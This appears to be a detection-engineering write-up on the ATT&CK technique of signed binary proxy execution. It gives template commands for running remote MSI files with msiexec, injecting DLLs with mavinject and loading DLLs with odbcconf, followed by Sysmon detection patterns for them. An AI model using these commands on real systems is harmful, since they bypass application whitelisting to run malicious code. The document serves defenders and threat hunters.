# T1218: Signed Binary Proxy Execution

Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

## Msiexec.exe
Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files. Msiexec.exe may also be used to execute DLLs.
```
msiexec.exe /q /i "C:\path\to\file.msi"
msiexec.exe /q /i http[:]//site[.]com/file.msi
msiexec.exe /y "C:\path\to\file.dll"
```
## Mavinject.exe
Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process.
```
"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>
C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>
```
## SyncAppvPublishingServer.exe
SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe.

## Odbcconf.exe
Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The utility can be misused to execute functionality equivalent to Regsvr32 with the REGSVR option to execute a DLL.
```
odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}
```
Several other binaries exist that may be used to perform similar behavior.

## Detection
```
Event 1
Sysmon Event ID = 1
Windows Security Event ID = 4688
process_command_line = "*mavinject*\/injectrunning*" or "mavinject32*\/injectrunning*" or "*certutil*script\:http\[\:\]\/\/*" or
                       "*certutil*script\:https\[\:\]\/\/*" or "*msiexec*http\[\:\]\/\/*" or "*msiexec*https\[\:\]\/\/*"

Event 2
Sysmon Event ID = 3
process_name = certutil.exe OR 
process_command_line = "*certutil*script\:http\[\:\]\/\/*" OR 
process_path = "*\\replace.exe"
```
